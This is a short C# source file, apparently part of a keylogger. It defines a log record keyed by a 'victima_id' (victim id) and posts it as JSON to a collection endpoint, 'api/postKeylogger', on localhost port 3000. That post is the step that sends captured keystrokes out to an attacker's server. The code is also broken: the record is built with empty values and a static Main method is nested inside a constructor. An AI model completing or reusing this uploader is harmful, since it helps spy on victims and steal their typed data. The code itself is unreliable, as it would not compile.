using System;
using System.Collections.Generic;
using System.Net.Http;
using System.Net.Http.Headers;

public class Log
{
    public string victima_id { get; set; }
    public string log { get; set; }
}

public class Class1
{
	public Class1()
	{
        static void Main(string[] args)
        {
            using (var client = new HttpClient())
            {
                Log p = new Log { victima_id=,log= };
                client.BaseAddress = new Uri("http://localhost:3000/");
                var response = client.PostAsJsonAsync("api/postKeylogger", p).Result;
                if (response.IsSuccessStatusCode)
                {
                    Console.Write("Success");
                }
                else
                    Console.Write("Error");
            }
        }

    }
}
